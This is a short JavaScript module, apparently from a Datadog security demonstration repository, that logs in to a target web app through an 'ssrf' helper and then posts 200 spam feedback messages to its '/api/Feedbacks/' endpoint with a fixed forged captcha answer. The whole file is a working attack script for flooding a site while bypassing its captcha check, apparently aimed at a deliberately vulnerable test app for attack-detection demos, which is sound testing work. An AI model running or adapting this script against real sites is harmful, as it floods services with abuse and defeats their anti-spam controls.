// Unless explicitly stated otherwise all files in this repository are licensed under the Apache 2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/) Copyright 2023 Datadog, Inc.

const  ora = require('ora');
const logSymbols= require('log-symbols');
const { http } = require('../lib/request');
const ssrf = require('./ssrf');

const threshold = 100;

async function spam(targetURL){

    let info = await ssrf.createAndLogin(targetURL)

    const spinner = ora('Sending spam').start();

    for (let i = 0; i < 200; i++) {
        spinner.text = 'Sending spam: ' + (i+1).toString() + ' / 200';
        await http(info.token).post(targetURL + '/api/Feedbacks/',{
            captcha: "-2",
            captchaId: 0,
            comment: "I'm a spam message",
            rating: 2
        })
        await new Promise(r => setTimeout(r, 100));
    }

    spinner.stopAndPersist({
                    symbol: logSymbols.success,
                    text: 'Sending spam: 200 spam messages sent',
                });
   
}

module.exports = { spam }